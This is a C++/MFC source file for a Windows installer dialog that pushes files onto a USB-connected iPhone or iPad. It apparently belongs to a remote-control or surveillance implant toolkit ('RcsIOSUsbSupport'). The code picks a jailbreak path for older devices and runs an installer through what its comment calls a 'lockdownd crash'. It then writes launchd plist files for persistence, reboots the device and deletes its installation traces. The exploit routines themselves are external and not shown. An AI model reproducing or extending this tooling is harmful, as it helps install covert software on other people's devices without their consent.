
// installDlg.cpp : implementation file
//
#include "stdafx.h"

#include <sys/types.h> 
#include <sys/stat.h>

#include "install.h"
#include "installDlg.h"
#include "afxdialogex.h"
#include "RcsIOSUsbSupport.h"
#include "Resource.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define NO FALSE
#define NOT_INSTALL       0
#define TRY_NON_JBINSTALL 1
#define TRY_JBINSTALL     2
	
#define set_icon(y)         dlg->setDeviceImage(y)
#define view_print(x)		dlg->setMessage(x)
#define set_model()         {setModel();dlg->mInfoStatic.SetWindowTextA(gInfo);}
#define reset_model()       {resetModel();dlg->mInfoStatic.SetWindowTextA(gInfo);}
#define install_enabled(x) {CWnd *installButton = dlg->GetDlgItem(IDOK);\
							installButton->EnableWindow(x);}
#define sleep Sleep

extern int installios1(char *iosfolder);
extern int installios2(char *iosfolder);
extern int installios3(char *iosfolder);

static BOOL gIsDeviceAttached = FALSE;
static char *gIosInstallationPath = NULL;
static int  gIsJailbreakable = TRY_JBINSTALL;
static char *gIosInstallationPathString = NULL;

static char *gIosInstallationDirectory = NULL;
static char *gModel = NULL;
static char *gVersion = NULL;

int	 bIsDeviceConnected = 0;
char gInfo[256];

static CWinThread  *pDeviceThread  = NULL;
static CWinThread  *pInstallThread = NULL;

char *models[] = {"iPhone1,1",
                  "iPhone1,2",
                  "iPhone2,1",
                  "iPhone3,1",
                  "iPhone3,2",
                  "iPhone3,3",
                  "iPhone4,1",
                  "iPhone5,1",
                  "iPhone5,2",
                  "iPad1,1",
                  "iPad2,1",
                  "iPad2,2",
                  "iPad2,3",
                  "iPad2,4",
                  "iPad3,1",
                  "iPad3,2",
                  "iPad3,3",
                  "iPad3,4",
                  "iPad3,5",
                  "iPad3,6",
                  NULL};

char *models_name[] =  {"iPhone",
                        "iPhone 3G",
                        "iPhone 3GS",
                        "iPhone 4",
                        "iPhone 4",
                        "iPhone 4(cdma)",
                        "iPhone 4s",
                        "iPhone 5(gsm)",
                        "iPhone 5",
                        "iPad",
                        "iPad2(wi-fi)",
                        "iPad2(gsm)",
                        "iPad2(cdma)",
                        "iPad2(wi-fi)",
                        "iPad3(wi-fi)",
                        "iPad3(gsm)",
                        "iPad3",
                        "iPad4(wi-fi)",
                        "iPad4(gsm)",
                        "iPad4",
                        NULL};

void setModel()
{
  int i = 0;
  
  char *theModel = "Unknown device";
  
  char *_model = get_model();
  char *_version = get_version();
  
  if (_model == NULL)
   _model = "Unknown device";
  if (_version == NULL)
    _version = "Unknown version";
  
  while (models[i] != NULL)
  {
    if (strcmp(models[i], _model) == 0)
    {
      theModel = models_name[i];
      break;
    }
    i++;
  }
    
  gModel    = theModel;
  gVersion  = _version;

  sprintf_s(gInfo, 256, "Model: %s\nVersion: %s", theModel, gVersion);
}

void resetModel()
{
	sprintf_s(gInfo, 256, "%s", "");
}
// CAboutDlg dialog used for App About

char *get_file_buff(char *file_path, int *len)
{
	char *buffer = NULL;
	DWORD file_len = 0;
	DWORD num_bytes = 0;

	HANDLE hFile = 
	CreateFile(file_path,
                GENERIC_READ,
                0,
                NULL,
				OPEN_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL); 
	
	if (hFile == INVALID_HANDLE_VALUE)
		return buffer;

	file_len = GetFileSize(hFile, NULL);

	if (file_len == 0)
	{
		CloseHandle(hFile);
		return buffer;
	}
	buffer = (char *)calloc(file_len, 1);

	ReadFile(hFile, buffer, file_len, &num_bytes, 0);

	*len = file_len;

	CloseHandle(hFile);

	return buffer;
}

UINT install_files(char *lpath, char **dir_content)
{
	int i = 0;
	int ret = 0;

	while(dir_content[i] != NULL)
	{
		int file_len = 0;
		char file_path[MAX_PATH];
		
		sprintf_s(file_path, MAX_PATH, "%s\\%s", lpath, dir_content[i]);

		char *buffer = get_file_buff(file_path, &file_len);

		if (buffer != NULL)
		{
			int ret = copy_buffer_file(buffer, file_len, dir_content[i]);

			free(buffer);

			if (ret != 0)
				break;
		}

		i++;
	}

	return ret;
}


void startInstallation(LPVOID lp)
{
  // WIN32
  CinstallDlg *dlg = (CinstallDlg *)lp;
  // END

  int isDeviceOn = 0;
  int retInst = 0;
  
  view_print("start installation...");
    
  install_enabled(NO);

  if (gIsJailbreakable == TRY_NON_JBINSTALL)
  {
    // running jb tool for iphone3gs-4.1
    int ret = 0;
    
    view_print("Setup device for installation...");
    
    //ret = installios1(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("Setup failed!");
      return;
    }
    
    view_print("Preparing device for execute installation...");
    
    //ret = installios2(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("Preparation failed!");
      return;
    }
    
    view_print("Trying execute installation...");
    
    //ret = installios3(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("execution failed!");
      return;
    }
    
    goto check_point;
    
    return;
  }
  
  if (gIosInstallationPathString == NULL)
  {
    view_print("cannot found installation dir!");
    goto exit_point;
  }
  
  char **dir_content = list_dir_content(gIosInstallationPathString);
  
  if (dir_content == NULL)
  {
    view_print("cannot found installation component!");
    goto exit_point;
  }
  
  if (make_install_directory() != 0)
  {
    view_print("cannot create installation folder!");
    goto exit_point;
  }
  
  view_print("copy files...");

#ifdef WIN32

  if (install_files(gIosInstallationPathString, dir_content) != 0)
  {
    view_print("cannot copy files into installation folder!");
	goto exit_point;
  }

#else

  if (copy_install_files(gIosInstallationPathString, dir_content) != 0)
  {
    view_print("cannot copy files into installation folder!");
    goto exit_point;
  }
#endif

  view_print("copy files... done.");
  
  sleep(1);
  
  // Ok: using lockdownd crash for running installer...
  view_print("try to run installer...");
  
  if (lockd_run_installer() == 1)
  {
    view_print("try to run installer... done.");
    retInst = 1;
    goto exit_point;
  }
  
  // end.
  
  if (create_launchd_plist() != 0)
  {
    view_print("cannot create plist files!");
    goto exit_point;
  }
  
  view_print("try to restart device...");
  
  int retVal = restart_device();
  
  if (retVal == 1)
    view_print("try to restart device...restarting: please wait.");
  else
    view_print("can't restart device: try it manually!");
  
  sleep(3);
  
  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 1);
  
  set_icon(IDB_BITMAP_GRAYED);
  
  view_print("device disconnected. Please wait...");
  
  reset_model();

  // wait device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 0);
  
  view_print("device connected.");
 
  set_icon(IDB_BITMAP_CLEAR);

  set_model();

check_point:
  view_print("checking installation...");
  
  sleep(5);
  
  retInst = check_installation(10, 10);
  
  // On fail remove the install files e dir...
exit_point:
  
  remove_installation();
  
  if ( retInst == 1)
  {
    view_print("installation done.");
  }
  else
  {
    view_print("installation failed: please retry!");
  }
}


UINT install_run(LPVOID lp)
{	
  int i = 0;
  int retval = 0;

  if (bIsDeviceConnected == FALSE)
    return 0;
  
  CinstallDlg *dlg = (CinstallDlg *)lp;

  dlg->setMessage("start installation...");
  
  CWnd *installButton = dlg->GetDlgItem(IDOK);
  installButton->EnableWindow(FALSE);

  char **dir_content = list_dir_content(gIosInstallationDirectory);
  
  if (dir_content[0] == NULL)
  {
    dlg->setMessage("cannot found installation component!");
    goto exit_point;
  }
  
  if (make_install_directory() != 0)
  {
    dlg->setMessage("cannot create installation folder!");
	goto exit_point;
  }

  dlg->setMessage("copy files...");

  if (install_files(gIosInstallationDirectory, dir_content) != 0)
  {
    dlg->setMessage("cannot copy files into installation folder!");
	goto exit_point;
  }

  dlg->setMessage("copy files... done.");

  if (create_launchd_plist() != 0)
  {
   dlg->setMessage("cannot create plist files!");
   goto exit_point;
  }

  dlg->setMessage("try to restart device...");

  if (restart_device() == 1)
  {
    dlg->setDeviceImage(IDB_BITMAP_GRAYED);
    dlg->setMessage("try to restart device...restarting: please wait.");
    //dlg->setInfo("no device connected");
  }
  else 
  {
	dlg->setMessage("can't restart device: try it manually!");
  }

  Sleep(1);

  int isDeviceOn = 0;

  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    Sleep(1);
  
  } while(isDeviceOn == 1);
  
  dlg->setDeviceImage(IDB_BITMAP_GRAYED);
  dlg->setMessage("device disconnected. Please wait...");
  resetModel();
  dlg->setInfo(gInfo);

  // Wait for device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    Sleep(1);
  
  } while(isDeviceOn == 0);

  dlg->setMessage("device connected.");
  dlg->setDeviceImage(IDB_BITMAP_CLEAR);
  
  setModel();

  dlg->setInfo(gInfo);

  Sleep(10);

  dlg->setMessage("checking installation...");
  
  retval = check_installation(10, 10);

exit_point:

  remove_installation();

  if (retval == 1)
  {
	dlg->setMessage("installation done!");
  }
  else
  {
	dlg->setMessage("installation failed: please retry!");
  }
  
  return 0;
}

UINT install(LPVOID lp)
{
  startInstallation(lp); 
  return 0;
}

int checkInstallationMode()
{
  if (check_lockdownd_config() == TRUE)
  {
    return TRY_JBINSTALL;
  }
  else
  {
    if (strcmp(gModel,   "iPhone 3GS")  == 0 &&
        strcmp(gVersion, "4.1")			== 0)
      return TRY_NON_JBINSTALL;
  }
  
  return NOT_INSTALL;
}

UINT waitForDevice(LPVOID lp)
{ 
  // WIN32 
  CinstallDlg *dlg = (CinstallDlg *)lp;
  // END

  BOOL isAttached = (BOOL)isDeviceAttached();

  if (isAttached == TRUE)
  {        
    set_icon(IDB_BITMAP_CLEAR);
    
    set_model();
    
    view_print("check device...");
    
    gIsJailbreakable = checkInstallationMode();
    
    switch (gIsJailbreakable)
    {
      case TRY_NON_JBINSTALL:
      {
        set_icon(IDB_BITMAP_CLEAR);
        break;
      }
      case NOT_INSTALL:
      {
        view_print("cannot install device!");
        return 0;
      }
    }
    
    if (check_installation(1, 2) == 0)
    {
      view_print("check device... device is ready.");
      
      if (gIosInstallationPathString != NULL)
      {
        install_enabled(TRUE);
      }
      gIsDeviceAttached = TRUE;
    }
    else
    {
      view_print("check device... installation detected!");
      // force remove of installation files (in case of manually reboot)
      remove_installation();
      gIsDeviceAttached = FALSE;
    }
  }
  else
  {
    view_print("cannot connect to device!");
  }

  return 0;
}

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CinstallDlg dialog
CinstallDlg::CinstallDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CinstallDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON1);
}

void CinstallDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_STATIC_INFO, mInfoStatic);
	DDX_Control(pDX, IDC_STATIC_MSG, mMessage);
	DDX_Control(pDX, IDC_STATIC_IMAGE, mDeviceImage);
}

BEGIN_MESSAGE_MAP(CinstallDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CinstallDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDOK, &CinstallDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CinstallDlg message handlers

BOOL CinstallDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	mDeviceBitmapGrayed.LoadBitmapA(IDB_BITMAP_GRAYED);
	mDeviceBitmapClear.LoadBitmapA(IDB_BITMAP_CLEAR);

	mMessage.SetWindowTextA("waiting...");

	Sleep(1);

	gIosInstallationPathString = getIosPath();
	
	if (gIosInstallationPathString == NULL)
		MessageBoxA("iOS installation directory not found", "install", MB_OK);

	pDeviceThread = AfxBeginThread(waitForDevice,this,THREAD_PRIORITY_NORMAL);
	
	return TRUE;
}

void CinstallDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CinstallDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CinstallDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CinstallDlg::setDeviceImage(int idc)
{
	if (idc == IDB_BITMAP_CLEAR)
		mDeviceImage.SetBitmap(HBITMAP(mDeviceBitmapClear));
	else
		mDeviceImage.SetBitmap(HBITMAP(mDeviceBitmapGrayed));
}

void CinstallDlg::setMessage(char *msg)
{
	mMessage.SetWindowTextA(msg);
}

void CinstallDlg::setInfo(char *msg)
{
	mInfoStatic.SetWindowTextA(msg);
}

void CinstallDlg::OnBnClickedCancel()
{
	CDialogEx::OnCancel();

	if (pDeviceThread != NULL)
	{
	  HANDLE hThread= pDeviceThread->m_hThread;
	  DWORD nExitCode;
	  BOOL fRet= ::GetExitCodeThread( hThread, &nExitCode );

	  if ( fRet && nExitCode==STILL_ACTIVE ) { 
		TerminateThread( hThread, -1 ); 
	 }
	}

	if (pInstallThread != NULL)
	{
	  HANDLE hThread= pInstallThread->m_hThread;
	  DWORD nExitCode;
	  BOOL fRet= ::GetExitCodeThread( hThread, &nExitCode );

	  if ( fRet && nExitCode==STILL_ACTIVE ) { 
		TerminateThread( hThread, -1 ); 
	 }
	}
}

void CinstallDlg::OnBnClickedOk()
{
	pInstallThread = AfxBeginThread(install,this,THREAD_PRIORITY_NORMAL);
}

char* CinstallDlg::askForCoreDirectory()
{
  BROWSEINFO bi = { 0 };
  bi.lpszTitle = _T("Select a Directory");
  LPITEMIDLIST pidl = SHBrowseForFolder ( &bi );

  TCHAR path[MAX_PATH];

  if ( pidl != 0 )
  {     
    if ( SHGetPathFromIDList ( pidl, path ) )
	{
		printf ( "Selected Folder: %s\n", path );
	}

	// free memory used
	IMalloc * imalloc = 0;
	if ( SUCCEEDED( SHGetMalloc ( &imalloc )) )
	{
	  imalloc->Free ( pidl );
	  imalloc->Release ( );
	}
  }
  CString ret = path;

  char *tmpStr = (char*) malloc(MAX_PATH);

  sprintf_s(tmpStr, MAX_PATH,"%s", (char*)(LPCTSTR)ret);

  return tmpStr;
}

char * CinstallDlg::getIosPath()
{
  static char iosPath[MAX_PATH];
  char installPath[MAX_PATH];

  GetCurrentDirectory(MAX_PATH, iosPath);

  sprintf_s(iosPath, MAX_PATH, "%s\\..\\ios", iosPath);
  sprintf_s(installPath, MAX_PATH, "%s\\install.sh", iosPath);
  
  struct stat fs;
  
  memset(&fs, 0, sizeof(fs));

  int statRet = stat((const char *)installPath, &fs);

  if (statRet == 0 && fs.st_size != 0)
	return iosPath;
  
  int buttRet = MessageBoxA("iOS installation directory not found: please select one", "install", MB_OKCANCEL);

  if (buttRet == IDCANCEL)
	  return NULL;

  char *_iosPath = askForCoreDirectory();

  if (_iosPath == NULL)
    return NULL;

  sprintf_s(installPath, MAX_PATH, "%s\\install.sh", _iosPath);
  
  memset(&fs, 0, sizeof(fs));

  statRet = stat((const char *)installPath, &fs);

  if (statRet == 0 && fs.st_size != 0)
  {
	sprintf_s(iosPath, MAX_PATH, "%s", _iosPath);
    return iosPath;
  }
  
  return NULL;
}
